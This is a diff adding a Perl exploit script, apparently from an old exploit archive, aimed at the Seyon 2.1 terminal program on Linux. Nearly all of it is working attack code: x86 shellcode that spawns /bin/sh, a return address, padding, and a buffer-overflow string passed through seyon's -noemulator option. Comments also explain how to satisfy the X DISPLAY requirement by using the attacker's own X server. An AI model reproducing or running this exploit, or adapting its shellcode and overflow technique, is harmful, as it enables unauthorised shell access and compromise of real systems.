@@ -1,0 +1,69 @@
+#!/usr/bin/perl
+
+## (c) Copyright teleh0r@doglover.com / anno domani 2000
+##
+## Seyon Exploit / Tested Version 2.1 rev. 4b i586-Linux
+## Tested on: RedHat 4.0/5.1
+##
+## Greets: scrippie, *@HWA, grazer, mixter, pr0ix, s\
+## http://www.digit-labs.org/ || http://teleh0r.cjb.net/
+
+
+$shellcode =
+    "\xeb\x1f".                  #/* jmp 0x1f              */
+    "\x5e".                      #/* popl %esi             */
+    "\x89\x76\x08".              #/* movl %esi,0x8(%esi)   */
+    "\x31\xc0".                  #/* xorl %eax,%eax        */
+    "\x88\x46\x07".              #/* movb %eax,0x7(%esi)   */
+    "\x89\x46\x0c".              #/* movl %eax,0xc(%esi)   */
+    "\xb0\x0b".                  #/* movb $0xb,%al         */
+    "\x89\xf3".                  #/* movl %esi,%ebx        */
+    "\x8d\x4e\x08".              #/* leal 0x8(%esi),%ecx   */
+    "\x8d\x56\x0c".              #/* leal 0xc(%esi),%edx   */
+    "\xcd\x80".                  #/* int $0x80             */
+    "\x31\xdb".                  #/* xorl %ebx,%ebx        */
+    "\x89\xd8".                  #/* movl %ebx,%eax        */
+    "\x40".                      #/* inc %eax              */
+    "\xcd\x80".                  #/* int $0x80             */
+    "\xe8\xdc\xff\xff\xff".      #/* call -0x24            */
+    "/bin/sh";                   #/* .string \"/bin/sh\"   */
+
+
+$ret = 0xbfffef96;
+$egg = 500;
+$len = 208;
+$nop = 'A';
+
+if (@ARGV == 1) {
+    $offset = $ARGV[0];
+}
+
+if (!($ENV{'DISPLAY'})) {
+    die("Error: the shell variable DISPLAY is not set.\n");
+}
+
+$buffer .= $nop;
+$new_ret = pack('l',($ret + $offset));
+
+print("Address: 0x", sprintf('%lx',($ret + $offset)), "\n");
+sleep(1);
+
+for ($i = 0; $i < $len; $i += 4) {
+    $buffer .= pack('l',($ret + $offset));
+}
+
+for ($i = 0; $i < ($egg - length($shellcode)); $i++) {
+    $buffer .= $nop;
+}
+
+$buffer .= $shellcode; 
+
+# seyon uses X, so if there is no X server running, or you
+# are not allowed to connect to it, start X on your machine, 
+# and using xhost, allow the target to connect to your server, 
+# then: export DISPLAY=your-ip:0.0 - and execute the exploit. 
+
+exec("/usr/X11R6/bin/seyon -noemulator \"$buffer\"");
+
+
+# milw0rm.com [2001-01-15]
